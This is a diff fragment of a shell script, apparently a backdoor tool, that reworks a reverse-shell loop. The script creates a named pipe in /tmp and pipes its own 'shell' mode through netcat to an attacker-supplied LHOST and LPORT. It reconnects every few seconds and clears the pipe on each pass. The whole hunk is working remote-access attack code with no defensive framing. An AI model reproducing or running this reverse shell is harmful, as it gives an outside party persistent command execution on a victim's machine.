@@ -10,12 +10,15 @@ then
 	LPORT=$3
 
 	rm -rf /tmp/zeus*
-	mkfifo /tmp/zeusPipe
 
 	while true
 	do
+		mkfifo /tmp/zeusPipe
+
 		cat /tmp/zeusPipe|$0 shell 2>&1|nc $LHOST $LPORT >/tmp/zeusPipe
 		sleep 3
+
+		rm -rf /tmp/zeus*
 	done
 
 elif [ "$OPTIONS" = "shell" ]
